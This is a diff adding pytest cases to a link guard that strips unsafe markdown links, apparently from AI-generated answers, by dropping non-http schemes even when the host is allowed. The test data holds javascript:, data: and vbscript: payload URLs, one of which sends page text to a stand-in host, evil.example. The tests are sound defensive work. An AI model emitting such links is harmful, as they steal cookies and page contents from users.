@@ -72,6 +72,26 @@ def test_guard_parses_backslashes_like_a_browser(url):
         assert len(removed) == 1
 
 
+@pytest.mark.parametrize("url", [
+    "javascript://intranet.harbourline.example/%0Aalert%28document.cookie%29",
+    "JavaScript://harbourline.example/%0Alocation='//evil.example/?q='+document.body.innerText",
+    "data://harbourline.example/text/html,%3Cscript%3Ealert%281%29%3C/script%3E",
+    "vbscript://harbourline.example/",
+])
+def test_guard_refuses_non_http_links_with_an_allowed_host(url):
+    # urlparse finds harbourline.example in each of these; a browser runs them as script instead.
+    cleaned, removed = guard_answer(f"See [policy]({url}) now.", allowed_domains=["harbourline.example"])
+    assert cleaned == "See policy now."
+    assert len(removed) == 1
+
+
+def test_guard_keeps_http_and_schemeless_links_to_allowed_domains():
+    answer = ("See [a](http://harbourline.example/a), [b](HTTPS://intranet.harbourline.example/b) "
+              "and [c](intranet.harbourline.example/c).")
+    cleaned, removed = guard_answer(answer, allowed_domains=["harbourline.example"])
+    assert cleaned == answer and removed == []
+
+
 def test_spotlight_boundary_is_random_and_wraps_every_passage():
     a, ba = spotlight(["one", "two"])
     b, bb = spotlight(["one", "two"])
